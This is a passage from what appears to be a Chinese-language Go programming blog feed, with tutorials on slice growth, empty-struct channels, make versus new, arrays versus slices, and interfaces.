<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x3D;&#x3D;&#x3D; RUN   TestSelect</span><br><span class="line">chs[0]</span><br><span class="line">numbers[2]</span><br><span class="line">chs[1]</span><br><span class="line">numbers[3]</span><br></pre></td></tr></table></figure>


]]></content>
      <categories>
        <category>Go</category>
      </categories>
      <tags>
        <tag>golang</tag>
        <tag>select</tag>
      </tags>
  </entry>
  <entry>
    <title>Slice扩容分析</title>
    <url>/2020/08/25/slice_append/</url>
    <content><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p><code>slice</code> 翻译成中文就是切片，它和数组（array）很类似，可以用下标的方式进行访问，<br>如果越界，就会产生 panic, 但是它比数组更灵活，可以自动地进行扩容。</p>
<h1 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h1><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// runtime/slice.go</span></span><br><span class="line"><span class="keyword">type</span> slice <span class="keyword">struct</span> &#123;</span><br><span class="line">    array unsafe.Pointer <span class="comment">// 元素指针</span></span><br><span class="line">    <span class="built_in">len</span>   <span class="keyword">int</span> <span class="comment">// 长度 </span></span><br><span class="line">    <span class="built_in">cap</span>   <span class="keyword">int</span> <span class="comment">// 容量</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>指针，指向底层数组；</li>
<li>长度，表示切片可用元素的个数，也就是说使用下标对 slice 的元素进行访问时，下标不能超过 slice 的长度；</li>
<li>容量，底层数组的元素个数，容量 &gt;= 长度。在底层数组不进行扩容的情况下，容量也是 slice 可以扩张的最大限度。</li>
</ul>
<h1 id="追加扩容"><a href="#追加扩容" class="headerlink" title="追加扩容"></a>追加扩容</h1><p>向切片中追加元素应该是最常见的切片操作，在 Go 语言中我们会使用 append 关键字向切片追加元素</p>
<h2 id="代码栗子"><a href="#代码栗子" class="headerlink" title="代码栗子"></a>代码栗子</h2><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">slice1 := <span class="built_in">make</span>([]<span class="keyword">int</span>,<span class="number">1</span>,)</span><br><span class="line">fmt.Println(<span class="string">&quot;cap of slice1&quot;</span>,<span class="built_in">cap</span>(slice1))</span><br><span class="line">slice1 = <span class="built_in">append</span>(slice1,<span class="number">1</span>)</span><br><span class="line">fmt.Println(<span class="string">&quot;cap of slice1&quot;</span>,<span class="built_in">cap</span>(slice1))</span><br><span class="line">slice1 = <span class="built_in">append</span>(slice1,<span class="number">2</span>)</span><br><span class="line">fmt.Println(<span class="string">&quot;cap of slice1&quot;</span>,<span class="built_in">cap</span>(slice1))</span><br><span class="line"></span><br><span class="line">fmt.Println()</span><br><span class="line"></span><br><span class="line">slice1024 := <span class="built_in">make</span>([]<span class="keyword">int</span>,<span class="number">1024</span>)</span><br><span class="line">fmt.Println(<span class="string">&quot;cap of slice1024&quot;</span>,<span class="built_in">cap</span>(slice1024))</span><br><span class="line">slice1024 = <span class="built_in">append</span>(slice1024,<span class="number">1</span>)</span><br><span class="line">fmt.Println(<span class="string">&quot;cap of slice1024&quot;</span>,<span class="built_in">cap</span>(slice1024))</span><br><span class="line">slice1024 = <span class="built_in">append</span>(slice1024,<span class="number">2</span>)</span><br><span class="line">fmt.Println(<span class="string">&quot;cap of slice1024&quot;</span>,<span class="built_in">cap</span>(slice1024))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>output</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cap of slice1 1</span><br><span class="line">cap of slice1 2</span><br><span class="line">cap of slice1 4</span><br><span class="line"></span><br><span class="line">cap of slice1024 1024</span><br><span class="line">cap of slice1024 1280</span><br><span class="line">cap of slice1024 1280</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>append中间代码生成阶段的 <a href="https://github.com/golang/go/blob/a037582efff56082631508b15b287494df6e9b69/src/cmd/compile/internal/gc/ssa.go#L2732-L2884">cmd/compile/internal/gc.state.append</a> 方法会拆分 append 关键字，该方法<br>追加元素会根据返回值是否会覆盖原变量，分别进入两种流程，如果 append 返回的『新切片』不需要赋值回原有的变量，就会进入如下的处理流程：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// append(slice, 1, 2, 3)</span></span><br><span class="line">ptr, <span class="built_in">len</span>, <span class="built_in">cap</span> := slice</span><br><span class="line">newlen := <span class="built_in">len</span> + <span class="number">3</span></span><br><span class="line"><span class="keyword">if</span> newlen &gt; <span class="built_in">cap</span> &#123;</span><br><span class="line">    ptr, <span class="built_in">len</span>, <span class="built_in">cap</span> = growslice(slice, newlen)</span><br><span class="line">    newlen = <span class="built_in">len</span> + <span class="number">3</span></span><br><span class="line">&#125;</span><br><span class="line">*(ptr+<span class="built_in">len</span>) = <span class="number">1</span></span><br><span class="line">*(ptr+<span class="built_in">len</span>+<span class="number">1</span>) = <span class="number">2</span></span><br><span class="line">*(ptr+<span class="built_in">len</span>+<span class="number">2</span>) = <span class="number">3</span></span><br><span class="line"><span class="keyword">return</span> makeslice(ptr, newlen, <span class="built_in">cap</span>)</span><br></pre></td></tr></table></figure>

<p>我们会先对切片结构体进行解构获取它的数组指针、大小和容量，如果在追加元素后切片的大小大于容量，<br>那么就会调用 <a href="https://github.com/golang/go/blob/440f7d64048cd94cba669e16fe92137ce6b84073/src/runtime/slice.go#L76-L191">runtime.growslice</a> 对切片进行扩容并将新的元素依次加入切片；如果 append 后的切片会覆盖<br>原切片，即 slice = append(slice, 1, 2, 3)，<a href="https://github.com/golang/go/blob/a037582efff56082631508b15b287494df6e9b69/src/cmd/compile/internal/gc/ssa.go#L2732-L2884">cmd/compile/internal/gc.state.append</a> 就会使用另一种方式改写关键字：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// slice = append(slice, 1, 2, 3)</span></span><br><span class="line">a := &amp;slice</span><br><span class="line">ptr, <span class="built_in">len</span>, <span class="built_in">cap</span> := slice</span><br><span class="line">newlen := <span class="built_in">len</span> + <span class="number">3</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">uint</span>(newlen) &gt; <span class="keyword">uint</span>(<span class="built_in">cap</span>) &#123;</span><br><span class="line">   newptr, <span class="built_in">len</span>, newcap = growslice(slice, newlen)</span><br><span class="line">   vardef(a)</span><br><span class="line">   *a.<span class="built_in">cap</span> = newcap</span><br><span class="line">   *a.ptr = newptr</span><br><span class="line">&#125;</span><br><span class="line">newlen = <span class="built_in">len</span> + <span class="number">3</span></span><br><span class="line">*a.<span class="built_in">len</span> = newlen</span><br><span class="line">*(ptr+<span class="built_in">len</span>) = <span class="number">1</span></span><br><span class="line">*(ptr+<span class="built_in">len</span>+<span class="number">1</span>) = <span class="number">2</span></span><br><span class="line">*(ptr+<span class="built_in">len</span>+<span class="number">2</span>) = <span class="number">3</span></span><br></pre></td></tr></table></figure>

<p>是否覆盖原变量的逻辑其实差不多，最大的区别在于最后的结果是不是赋值会原有的变量，<br>如果我们选择覆盖原有的变量，也不需要担心切片的拷贝，因为 Go 语言的编译器已经对这种情况作了优化。</p>
<p>到这里我们已经通过 append 关键字被转换的控制流了解了在切片容量足够时如何向切片中追加元素，<br>但是当切片的容量不足时就会调用 <a href="https://github.com/golang/go/blob/440f7d64048cd94cba669e16fe92137ce6b84073/src/runtime/slice.go#L76-L191">runtime.growslice</a> 函数为切片扩容，<br>扩容就是为切片分配一块新的内存空间并将原切片的元素全部拷贝过去，我们分几部分分析该方法：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">growslice</span><span class="params">(et *_type, old slice, <span class="built_in">cap</span> <span class="keyword">int</span>)</span> <span class="title">slice</span></span> &#123;</span><br><span class="line">    newcap := old.<span class="built_in">cap</span></span><br><span class="line">    doublecap := newcap + newcap</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">cap</span> &gt; doublecap &#123;</span><br><span class="line">        newcap = <span class="built_in">cap</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> old.<span class="built_in">len</span> &lt; <span class="number">1024</span> &#123;</span><br><span class="line">            newcap = doublecap</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">for</span> <span class="number">0</span> &lt; newcap &amp;&amp; newcap &lt; <span class="built_in">cap</span> &#123;</span><br><span class="line">                newcap += newcap / <span class="number">4</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> newcap &lt;= <span class="number">0</span> &#123;</span><br><span class="line">                newcap = <span class="built_in">cap</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><strong>在分配内存空间之前需要先确定新的切片容量，Go 语言根据切片的当前容量选择不同的策略进行扩容：</strong></p>
<ol>
<li>如果期望容量大于当前容量的两倍就会使用期望容量；</li>
<li>如果当前切片的长度小于 1024 就会将容量翻倍；</li>
<li>如果当前切片的长度大于 1024 就会每次增加 25% 的容量，直到新容量大于期望容量；</li>
</ol>
<p>确定了切片的容量之后，就可以计算切片中新数组占用的内存了，计算的方法就是将目标容量和元素大小相乘，<br>计算新容量时可能会发生溢出或者请求的内存超过上限，在这时就会直接 panic，不过相关的代码在这里就被省略了：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> overflow <span class="keyword">bool</span></span><br><span class="line">    <span class="keyword">var</span> newlenmem, capmem <span class="keyword">uintptr</span></span><br><span class="line">    <span class="keyword">switch</span> &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        lenmem = <span class="keyword">uintptr</span>(old.<span class="built_in">len</span>) * et.size</span><br><span class="line">        newlenmem = <span class="keyword">uintptr</span>(<span class="built_in">cap</span>) * et.size</span><br><span class="line">        capmem, _ = math.MulUintptr(et.size, <span class="keyword">uintptr</span>(newcap))</span><br><span class="line">        capmem = roundupsize(capmem)</span><br><span class="line">        newcap = <span class="keyword">int</span>(capmem / et.size)</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">var</span> p unsafe.Pointer</span><br><span class="line">    <span class="keyword">if</span> et.kind&amp;kindNoPointers != <span class="number">0</span> &#123;</span><br><span class="line">        p = mallocgc(capmem, <span class="literal">nil</span>, <span class="literal">false</span>)</span><br><span class="line">        memclrNoHeapPointers(add(p, newlenmem), capmem-newlenmem)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        p = mallocgc(capmem, et, <span class="literal">true</span>)</span><br><span class="line">        <span class="keyword">if</span> writeBarrier.enabled &#123;</span><br><span class="line">            bulkBarrierPreWriteSrcOnly(<span class="keyword">uintptr</span>(p), <span class="keyword">uintptr</span>(old.array), lenmem)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    memmove(p, old.array, lenmem)</span><br><span class="line">    <span class="keyword">return</span> slice&#123;p, old.<span class="built_in">len</span>, newcap&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>append的时候发生扩容的动作</p>
<p>append单个元素，或者append少量的多个元素，这里的少量指double之后的容量能容纳，这样就会走以下扩容流程，不足1024，双倍扩容，超过1024的，1.25倍扩容。</p>
<p>若是append多个元素，且double后的容量不能容纳，直接使用预估的容量。</p>
<p><strong>此外，以上两个分支得到新容量后，均需要根据slice的类型size，算出新的容量所需的内存情况capmem，然后再进行capmem向上取整，得到新的所需内存，除上类型size，得到真正的最终容量,作为新的slice的容量。</strong></p>
]]></content>
      <categories>
        <category>Go</category>
      </categories>
      <tags>
        <tag>golang</tag>
        <tag>slice</tag>
      </tags>
  </entry>
  <entry>
    <title>golang类型空结构体的通道</title>
    <url>/2020/08/24/channel_struct/</url>
    <content><![CDATA[<h1 id="空结构体"><a href="#空结构体" class="headerlink" title="空结构体"></a>空结构体</h1><p>空结构体的宽度是0，占用了0字节的内存空间。</p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> s <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line">fmt.Println(unsafe.Sizeof(s)) <span class="comment">// prints 0</span></span><br></pre></td></tr></table></figure>

<p>由于空结构体占用0字节，那么空结构体也不需要填充字节。所以空结构体组成的组合数据类型也不会占用内存空间。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">type S struct &#123;</span><br><span class="line"></span><br><span class="line">    A struct&#123;&#125;</span><br><span class="line"></span><br><span class="line">    B struct&#123;&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var s S</span><br><span class="line"></span><br><span class="line">fmt.Println(unsafe.Sizeof(s)) &#x2F;&#x2F; prints 0</span><br></pre></td></tr></table></figure>

<h1 id="chan-struct"><a href="#chan-struct" class="headerlink" title="chan struct{}"></a>chan struct{}</h1><p>通过消息来共享数据是golang的一种设计哲学，channel则是这种哲理的体现。</p>
<p>golang中的空结构体 channel := make(chan struct{})<br>它不能被写入任何数据，只有通过close()函数进行关闭操作，才能进行输出操作。<br>struct{}类型的channel不占用任何内存！<br>用空 struct 是对内存更友好的开发方式，在 go 源代码中针对 空struct 类数据内存申请部分，<br>返回地址都是一个固定的地址。那么就避免了可能的内存滥用。</p>
<h2 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h2><ul>
<li>省内存，尤其在事件通信的时候。</li>
<li>struct零值就是本身，读取close的channel返回零值</li>
</ul>
<h2 id="常用用法"><a href="#常用用法" class="headerlink" title="常用用法"></a>常用用法</h2><p>通常struct{}类型channel的用法是使用同步，<strong>一般不需要往channel里面写数据，只有读等待，<br>而读等待会在channel被关闭的时候返回。</strong></p>
<h2 id="栗子"><a href="#栗子" class="headerlink" title="栗子"></a>栗子</h2><figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> ch <span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125; = <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">TestChanStruct</span><span class="params">(t *testing.T)</span></span> &#123;</span><br><span class="line"></span><br><span class="line">    log.Println(<span class="string">&quot;main() 111&quot;</span>)</span><br><span class="line">    <span class="keyword">go</span> foo()</span><br><span class="line">    log.Println(<span class="string">&quot;main() 222&quot;</span>)</span><br><span class="line">    &lt;-ch</span><br><span class="line">    log.Println(<span class="string">&quot;main() 333&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">foo</span><span class="params">()</span></span> &#123;</span><br><span class="line"></span><br><span class="line">    log.Println(<span class="string">&quot;foo() 111&quot;</span>)</span><br><span class="line">    time.Sleep(<span class="number">1</span> * time.Second)</span><br><span class="line">    log.Println(<span class="string">&quot;foo() 222&quot;</span>)</span><br><span class="line">    <span class="built_in">close</span>(ch)</span><br><span class="line">    log.Println(<span class="string">&quot;foo() 333&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">=== RUN   TestChanStruct</span><br><span class="line">2020/08/24 19:33:28 main() 111</span><br><span class="line">2020/08/24 19:33:28 main() 222</span><br><span class="line">2020/08/24 19:33:28 foo() 111</span><br><span class="line">2020/08/24 19:33:29 foo() 222</span><br><span class="line">2020/08/24 19:33:29 foo() 333</span><br><span class="line">2020/08/24 19:33:29 main() 333</span><br><span class="line">--- PASS: TestChanStruct (1.00s)</span><br><span class="line">PASS</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Go</category>
      </categories>
      <tags>
        <tag>golang</tag>
        <tag>channel</tag>
      </tags>
  </entry>
  <entry>
    <title>make和new的区别</title>
    <url>/2020/08/20/make_new/</url>
    <content><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><blockquote>
<p>Go语言中的内建函数new和make是两个用于内存分配的原语（allocation primitives）。<br>new 和 make 都可以用来分配空间，初始化类型，但是它们确有不同。</p>
</blockquote>
<h1 id="make-只能用于-slice-map-channel"><a href="#make-只能用于-slice-map-channel" class="headerlink" title="make 只能用于 slice,map,channel"></a>make 只能用于 slice,map,channel</h1><figure class="highlight golang"><table><tr><td class="code"><pre><span class="line">slice := <span class="built_in">make</span>([]<span class="keyword">int</span>, <span class="number">3</span>)</span><br><span class="line">hash := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">bool</span>, <span class="number">10</span>)</span><br><span class="line">ch := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">int</span>, <span class="number">5</span>)</span><br></pre></td></tr></table></figure>

<p>make(T, args) 返回的是初始化之后的 T 类型的值，这个新值并不是 T 类型的零值，<br>也不是指针 *T，是经过初始化之后的 T 的引用</p>
<p>slice 的零值是 nil，使用 make 之后 slice 是一个初始化的 slice，<br>即 slice 的长度、容量、底层指向的 array 都被 make 完成初始化，此时 slice 内容被类型 int 的零值填充，形式是 [0 0 0]，<br>map 和 channel 也是类似的。</p>
<h1 id="new"><a href="#new" class="headerlink" title="new"></a>new</h1><p>new是一个用来分配内存的内建函数，但是与C++不一样的是，它并不初始化内存，只是将其置零。<br>new(T)会为T类型的新项目，分配被置零的存储，并且返回它的地址，一个类型为*T的值。<br>其返回一个指向新分配的类型为T的指针，这个指针指向的内容的值为零（zero value），但并不是指针为零。</p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line">p1 := <span class="built_in">new</span>(<span class="keyword">int</span>)</span><br><span class="line">fmt.Printf(<span class="string">&quot;p1 --&gt; %#v \n &quot;</span>, p1)  </span><br><span class="line">fmt.Printf(<span class="string">&quot;p1 point to --&gt; %#v \n &quot;</span>, *p1) </span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> p2 *<span class="keyword">int</span></span><br><span class="line">i := <span class="number">0</span></span><br><span class="line">p2 = &amp;i</span><br><span class="line">fmt.Printf(<span class="string">&quot;p2 --&gt; %#v \n &quot;</span>, p2) </span><br><span class="line">fmt.Printf(<span class="string">&quot;p2 point to --&gt; %#v \n &quot;</span>, *p2)</span><br></pre></td></tr></table></figure>

<p>执行结果如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">p1 --&gt; (*int)(0xc0004f9420) </span><br><span class="line">p1 point to --&gt; 0 </span><br><span class="line">p2 --&gt; (*int)(0xc0004f9428) </span><br><span class="line">p2 point to --&gt; 0 </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Notice"><a href="#Notice" class="headerlink" title="Notice"></a>Notice</h2><p>开发过程中new是很少使用的, 如下 struct 初始化的过程</p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">type</span> Foo <span class="keyword">struct</span> &#123;</span><br><span class="line">          age  <span class="keyword">int</span></span><br><span class="line">      &#125;</span><br><span class="line">   <span class="comment">//声明初始化</span></span><br><span class="line"><span class="keyword">var</span> foo1 Foo</span><br><span class="line">fmt.Printf(<span class="string">&quot;foo1 --&gt; %#v\n &quot;</span>, foo1) </span><br><span class="line">foo1.age = <span class="number">1</span></span><br><span class="line">fmt.Println(foo1.age)</span><br><span class="line"></span><br><span class="line"><span class="comment">//struct literal 初始化</span></span><br><span class="line">foo2 := Foo&#123;&#125;</span><br><span class="line">fmt.Printf(<span class="string">&quot;foo2 --&gt; %#v\n &quot;</span>, foo2) </span><br><span class="line">foo2.age = <span class="number">2</span></span><br><span class="line">fmt.Println(foo2.age)</span><br><span class="line"></span><br><span class="line"><span class="comment">//指针初始化</span></span><br><span class="line">foo3 := &amp;Foo&#123;&#125;</span><br><span class="line">fmt.Printf(<span class="string">&quot;foo3 --&gt; %#v\n &quot;</span>, foo3) </span><br><span class="line">foo3.age = <span class="number">3</span></span><br><span class="line">fmt.Println(foo3.age)</span><br><span class="line"></span><br><span class="line"><span class="comment">//new 初始化</span></span><br><span class="line">foo4 := <span class="built_in">new</span>(Foo)</span><br><span class="line">fmt.Printf(<span class="string">&quot;foo4 --&gt; %#v\n &quot;</span>, foo4) </span><br><span class="line">foo4.age = <span class="number">4</span></span><br><span class="line">fmt.Println(foo4.age)</span><br><span class="line"></span><br><span class="line"><span class="comment">//声明指针并用 new 初始化</span></span><br><span class="line"><span class="keyword">var</span> foo5 *Foo = <span class="built_in">new</span>(Foo)</span><br><span class="line">fmt.Printf(<span class="string">&quot;foo5 --&gt; %#v\n &quot;</span>, foo5) </span><br><span class="line">foo5.age = <span class="number">5</span></span><br><span class="line">fmt.Println(foo5.age)</span><br></pre></td></tr></table></figure>

<p>结果如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">foo1 --&gt; service.Foo&#123;age:0&#125;</span><br><span class="line"> 1</span><br><span class="line">foo2 --&gt; service.Foo&#123;age:0&#125;</span><br><span class="line"> 2</span><br><span class="line">foo3 --&gt; &amp;service.Foo&#123;age:0&#125;</span><br><span class="line"> 3</span><br><span class="line">foo4 --&gt; &amp;service.Foo&#123;age:0&#125;</span><br><span class="line"> 4</span><br><span class="line">foo5 --&gt; &amp;service.Foo&#123;age:0&#125;</span><br><span class="line"> 5</span><br></pre></td></tr></table></figure>

<p>foo1 和 foo2 是同样的类型，都是 Foo 类型的值，foo1 是通过 var 声明，Foo 的 filed 自动初始化为每个类型的零值，foo2 是通过字面量的完成初始化。foo3，foo4 和 foo5 是一样的类型，都是 Foo 的指针 Foo。</p>
<p>如果 x 是可寻址的，&amp;x 的 filed 集合包含 m，x.m 和 (&amp;x).m 是等同的，go 自动做转换，也就是 foo1.age 和 foo3.age 调用是等价的，go 自动做了转换。</p>
<p>因而可以直接使用 struct literal 的方式创建对象，能达到和 new 创建是一样的情况而不需要使用 new。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>make 和 new 关键字的实现原理，<br>make 关键字的作用是创建切片、哈希表和 Channel 等内置的数据结构，<br>new 的作用是为类型申请一片内存空间，并返回类型零值指向这片内存的指针。</p>
]]></content>
      <categories>
        <category>Go</category>
      </categories>
      <tags>
        <tag>golang</tag>
      </tags>
  </entry>
  <entry>
    <title>array与slice区别</title>
    <url>/2019/05/12/array_slice/</url>
    <content><![CDATA[<h1 id="array-类型"><a href="#array-类型" class="headerlink" title="array 类型"></a>array 类型</h1><blockquote>
<p>array是固定长度的数组，使用前必须确定数组长度</p>
</blockquote>
<p><code>golang array</code> 特点：</p>
<ul>
<li>golang中的数组是值类型,也就是说，如果你将一个数组赋值给另外一个数组，那么，实际上就是整个数组拷贝了一份</li>
<li>如果golang中的数组作为函数的参数，那么实际传递的参数是一份数组的拷贝，而不是数组的指针</li>
<li>array的长度也是Type的一部分，这样就说明[10]int和[20]int是不一样的。</li>
</ul>
<h1 id="slice类型"><a href="#slice类型" class="headerlink" title="slice类型"></a>slice类型</h1><ul>
<li>slice是一个引用类型，是一个动态的指向数组切片的指针。</li>
<li>slice是一个不定长的，总是指向底层的数组array的数据结构。</li>
</ul>
<ol>
<li>创建slice</li>
</ol>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">//动态数组创建，类似创建数组，但是没有指定固定长度</span></span><br><span class="line"><span class="keyword">var</span> al []<span class="keyword">int</span>     <span class="comment">//创建slice</span></span><br><span class="line">sl := <span class="built_in">make</span>([]<span class="keyword">int</span>,<span class="number">10</span>)  <span class="comment">//创建有10个元素的slice</span></span><br><span class="line">sl:=[]<span class="keyword">int</span>&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125; <span class="comment">//创建有初始化元素的slice</span></span><br></pre></td></tr></table></figure>


<p>2.先创建数组,在数组的基础上建立切片slice</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr =[<span class="number">10</span>]&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>，<span class="number">4</span>,<span class="number">5</span>。<span class="number">6</span>&#125;  </span><br><span class="line">sl := arr[<span class="number">2</span>:<span class="number">5</span>] <span class="comment">//创建有3个元素的slice</span></span><br></pre></td></tr></table></figure>


<p>3.slice有一些简便的操作</p>
<ul>
<li><code>slice</code>的默认开始位置是0，<code>ar[:n]</code>等价于<code>ar[0:n]</code></li>
<li><code>slice</code>的第二个序列默认是数组的长度，<code>ar[n:]</code>等价于<code>ar[n:len(ar)]</code></li>
</ul>
<h1 id="数组和slice的区别"><a href="#数组和slice的区别" class="headerlink" title="数组和slice的区别"></a>数组和slice的区别</h1><p>声明数组时，方括号内写明了数组的长度或者…,声明slice时候，方括号内为空<br>作为函数参数时，数组传递的是数组的副本，而slice传递的是指针</p>
]]></content>
      <categories>
        <category>Go</category>
      </categories>
      <tags>
        <tag>golang</tag>
        <tag>slice</tag>
        <tag>array</tag>
      </tags>
  </entry>
  <entry>
    <title>golang中的interface</title>
    <url>/2018/05/30/golang%E4%B8%AD%E7%9A%84interface/</url>
    <content><![CDATA[<h2 id="interface-是一种类型"><a href="#interface-是一种类型" class="headerlink" title="interface 是一种类型"></a>interface 是一种类型</h2><hr>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">type I interface &#123;</span><br><span class="line">   Get() int</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> </p>
<p>首先 <strong>interface 是一种类型</strong>，从它的定义可以看出来用了 type 关键字，更准确的说 interface 是一种<strong>具有一组方法的类型</strong>，这些方法定义了 interface 的行为。 go 允许不带任何方法的 interface ，这种类型的 interface 叫 <strong>empty interface</strong>。 <strong>如果一个类型实现了一个 interface 中所有方法，我们说类型实现了该 interface</strong>，所以所有类型都实现了 empty interface，因为任何一种类型至少实现了 0 个方法。go 没有显式的关键字用来实现 interface，只需要实现 interface 包含的方法即可。</p>
<h2 id="interface-变量存储的是实现者的值"><a href="#interface-变量存储的是实现者的值" class="headerlink" title="interface 变量存储的是实现者的值"></a>interface 变量存储的是实现者的值</h2><hr>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;1</span><br><span class="line">type I interface &#123;    </span><br><span class="line">    Get() int</span><br><span class="line">    Set(int)</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;2</span><br><span class="line">type S struct &#123;</span><br><span class="line">    Age int</span><br><span class="line">&#125;</span><br><span class="line">func(s S) Get()int &#123;</span><br><span class="line">    return s.Age</span><br><span class="line">&#125;</span><br><span class="line">func(s *S) Set(age int) &#123;</span><br><span class="line">    s.Age &#x3D; age</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;3</span><br><span class="line">func f(i I)&#123;</span><br><span class="line">    i.Set(10)</span><br><span class="line">    fmt.Println(i.Get())</span><br><span class="line">&#125;</span><br><span class="line">func main() &#123;</span><br><span class="line">    s :&#x3D; S&#123;&#125;</span><br><span class="line">    f(&amp;s)  &#x2F;&#x2F;4</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p> </p>
<p>这段代码在 <code>#1</code> 定义了 interface I，在 <code>#2</code> 用 struct S 实现了 I 定义的两个方法，接着在 <code>#3</code> 定义了一个函数 f 参数类型是 I，S 实现了 I 的两个方法就说 S 是 I 的实现者，执行 <code>f(&amp;s)</code> 就完了一次 interface 类型的使用。 interface 的重要用途就体现在<strong>函数 f 的参数中</strong>，如果有多种类型实现了某个 interface，<strong>这些类型的值都可以直接使用 interface 的变量存储</strong>。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">s :&#x3D; S&#123;&#125;</span><br><span class="line">var i I &#x2F;&#x2F;声明 i</span><br><span class="line">i &#x3D; &amp;s &#x2F;&#x2F;赋值 s 到 i</span><br><span class="line">fmt.Println(i.Get())</span><br></pre></td></tr></table></figure>

<p> </p>
<p>不难看出 interface 的变量中存储的是实现了 interface 的类型的对象值，这种能力是 <a href="http://en.wikipedia.org/wiki/Duck_typing">duck typing</a>。在使用 interface 时不需要显式在 struct 上声明要实现哪个 interface ，只需要实现对应 interface 中的方法即可，go 会自动进行 interface 的检查，并在运行时执行从其他类型到 interface 的自动转换，即使实现了多个 interface，go 也会在使用对应 interface 时实现自动转换，这就是 interface 的魔力所在。</p>
<h2 id="如何判断-interface-变量存储的是哪种类型"><a href="#如何判断-interface-变量存储的是哪种类型" class="headerlink" title="如何判断 interface 变量存储的是哪种类型"></a>如何判断 interface 变量存储的是哪种类型</h2><hr>
<p>一个 interface 被多种类型实现时，有时候我们需要区分 interface 的变量究竟存储哪种类型的值，go 可以使用 <code>comma, ok</code> 的形式做区分 <code>value, ok := em.(T)</code>：<strong>em 是 interface 类型的变量，T代表要断言的类型，value 是 interface 变量存储的值，ok 是 bool 类型表示是否为该断言的类型 T</strong>。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if t, ok :&#x3D; i.(*S); ok &#123;</span><br><span class="line">    fmt.Println(&quot;s implements I&quot;, t)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> </p>
<p>ok 是 true 表明 i 存储的是 <code>*S</code> 类型的值，false 则不是，这种区分能力叫 <a href="https://tour.golang.org/methods/15">Type assertions</a> (类型断言)。 如果需要区分多种类型，可以使用 switch 断言，更简单直接，这种断言方式只能在 switch 语句中使用。</p>
